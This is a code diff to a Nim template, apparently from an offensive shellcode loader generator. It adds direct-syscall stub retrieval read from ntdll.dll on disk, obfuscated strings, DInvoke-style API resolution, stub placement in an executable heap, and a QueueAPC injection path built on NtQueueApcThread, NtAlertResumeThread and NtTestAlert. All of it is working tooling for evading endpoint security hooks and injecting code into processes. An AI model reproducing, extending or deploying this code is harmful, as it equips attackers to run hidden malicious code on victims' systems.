@@ -142,11 +142,7 @@ when defined(GetSyscallStub):
         TotalLength*: SIZE_T
         Attributes*: array[2, PS_ATTRIBUTE]
       PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
-      KNORMAL_ROUTINE* {.pure.} = object
-        NormalContext*: PVOID
-        SystemArgument1*: PVOID
-        SystemArgument2*: PVOID
-      PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE
+
     
     var 
         SYSCALL_STUB_SIZE: int = 23
@@ -182,7 +178,21 @@ when defined(GetSyscallStub):
 
     var NtMapViewOfSection: proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
 
+    when defined(QueueAPC):
+      type myNtQueueApcThread = proc(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.stdcall.}
+      var NtQueueApcThread: proc(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.stdcall.}
 
+      type myNtAlertResumeThread = proc(ThreadHandle: HANDLE, PreviousSuspendCount: PULONG): NTSTATUS {.stdcall.}
+      var NtAlertResumeThread: proc(ThreadHandle: HANDLE, PreviousSuspendCount: PULONG): NTSTATUS {.stdcall.}
+
+      type myNtOpenThread = proc(ThreadHandle: PHANDLE; DesiredAccess: ACCESS_MASK; ObjectAttributes: POBJECT_ATTRIBUTES; ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
+      var NtOpenThread: proc(ThreadHandle: PHANDLE; DesiredAccess: ACCESS_MASK; ObjectAttributes: POBJECT_ATTRIBUTES; ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
+      
+      type myNtResumeThread = proc(ThreadHandle: HANDLE; SuspendCount: PULONG): NTSTATUS {.stdcall.}
+      var NtResumeThread: proc(ThreadHandle: HANDLE; SuspendCount: PULONG): NTSTATUS {.stdcall.}
+
+      type myNtTestAlert = proc(): NTSTATUS {.stdcall.}
+      var NtTestAlert: proc(): NTSTATUS {.stdcall.}
     
     type
       CreateFileA_t* = proc (lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
@@ -224,9 +234,24 @@ when defined(GetSyscallStub):
             ntdllString = obf("C:\\windows\\system32\\ntdll.dll")
         when defined(DInvoke):
             file = MyCreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
+            when defined(verbose):
+                echo obf("[*] CreateFileA Error Code: ") & $[GetLastError()]
             fileSize = MyGetFileSize(file, nil)
-            fileData = MyRtlAllocateHeap(cast[PVOID](MyGetProcessHeap()), 0, cast[SIZE_T](fileSize))
+            when defined(verbose):
+                echo obf("[*] MyGetFileSize Error Code: ") & $[GetLastError()]
+            if (ws2k12):
+                fileData = HeapAlloc(GetProcessHeap(), 0, fileSize)
+            else:
+                fileData = MyRtlAllocateHeap(cast[PVOID](MyGetProcessHeap()), 0, cast[SIZE_T](fileSize))
+            when defined(verbose):
+                echo obf("[*] MyRtlAllocateHeap Error Code: ") & $[GetLastError()]
             let success = MyReadFile(file, fileData, fileSize, addr bytesRead, nil)
+            when defined(verbose):
+                echo obf("[*] MyReadFile Error Code: ") & $[GetLastError()]
+                if (success):
+                    echo obf("[*] MyReadFile Success")
+                else:
+                    echo obf("[*] MyReadFile Failed")
         else:
             file = CreateFileA(ntdllString, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullHandle)
             fileSize = GetFileSize(file, nil)
@@ -259,6 +284,10 @@ when defined(GetSyscallStub):
             var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 1], textSection))
             var functionNameResolved: cstring = cast[cstring](functionNameVA)
             if (functionNameResolved == functionName):
+                if(ws2k12):
+                    # We adjust the functionVA by 7, as for some reason the functionVA is 7 ordinals off compared ntdll from disk to memory
+                    functionNameVA = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2 + 7], rdataSection))
+                    functionVA = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 8], textSection))
                 moveMemory(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
                 stubFound = 1
         return stubFound
@@ -270,19 +299,26 @@ let RetrieveSyscallStubs * = """
 
 
     var hProcess: HANDLE
+    
     when defined(DInvoke):
         hProcess = -1
 
         var pHandle2: HANDLE = -1
         var syscallStub_NtProtect: LPVOID
 
-        MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
-        syscallStub_NtProtect = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        #MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
+        #syscallStub_NtProtect = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        # This can not be used here, as it results in strange behaviours. Maybe due to too many syscall stubs for the heap.
+        var hHeap: HANDLE = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
+        syscallStub_NtProtect = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000)
     else:
         hProcess = -1
         var pHandle2: HANDLE = -1
         var syscallStub_NtProtect: LPVOID
-        syscallStub_NtProtect = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        #syscallStub_NtProtect = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        var hHeap: HANDLE = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
+        syscallStub_NtProtect = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000)
+
 
     var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
     
@@ -343,10 +379,6 @@ let RetrieveSyscallStubs * = """
         var syscallStub_NtOpenP: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (6 * cast[HANDLE](SYSCALL_STUB_SIZE))
         # define NtOpenProcess
         var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
-        when defined(DInvoke):
-            discard MyVirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        else:
-            VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
         
         syssuccess = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
         when defined(verbose):
@@ -358,7 +390,47 @@ let RetrieveSyscallStubs * = """
         when defined(verbose):
             echo obf("[*] GetSyscallStub NtCreateThreadEx: ") & $syssuccess
 
+    when defined(QueueAPC):
+        var syscallStub_NtQueueApcThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (8 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        var syscallStub_NtAlertResumeThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (9 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define NtQueueApcThread
+        NtQueueApcThread = cast[myNtQueueApcThread](cast[LPVOID](syscallStub_NtQueueApcThread))
+        # define NtAlertResumeThread
+        NtAlertResumeThread = cast[myNtAlertResumeThread](cast[LPVOID](syscallStub_NtAlertResumeThread))
 
+        var syscallStub_NtTestAlert: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (10 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define NtTestAlert
+        NtTestAlert = cast[myNtTestAlert](cast[LPVOID](syscallStub_NtTestAlert))
+        
+        var syscallStub_NtOpenThread: HANDLE = cast[HANDLE](cast[LPVOID](syscallStub_NtProtect) + (11 * cast[HANDLE](SYSCALL_STUB_SIZE)))
+        # define NtOpenThread
+        NtOpenThread = cast[myNtOpenThread](cast[LPVOID](syscallStub_NtOpenThread))
+
+        var syscallStub_NtResumeThread: HANDLE = cast[HANDLE](cast[LPVOID](syscallStub_NtProtect) + (12 * cast[HANDLE](SYSCALL_STUB_SIZE)))
+        # define NtResumeThread
+        NtResumeThread = cast[myNtResumeThread](cast[LPVOID](syscallStub_NtResumeThread))
+
+
+        syssuccess = GetSyscallStub(obf("NtQueueApcThread"), cast[LPVOID](syscallStub_NtQueueApcThread))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtQueueApcThread: ") & $syssuccess
+        
+        syssuccess = GetSyscallStub(obf("NtAlertResumeThread"), cast[LPVOID](syscallStub_NtAlertResumeThread))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtAlertResumeThread: ") & $syssuccess
+          
+        syssuccess = GetSyscallStub(obf("NtTestAlert"), cast[LPVOID](syscallStub_NtTestAlert))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtTestAlert: ") & $syssuccess
+        
+    when defined(DInvoke):
+      when defined(verbose):
+        echo obf("[*] Setting page protection")
+      discard MyVirtualProtect(syscallStub_NtProtect, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
+      when defined(verbose):
+        echo obf("[*] Done")
+    else:
+      VirtualProtect(syscallStub_NtProtect, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
     
 
 """
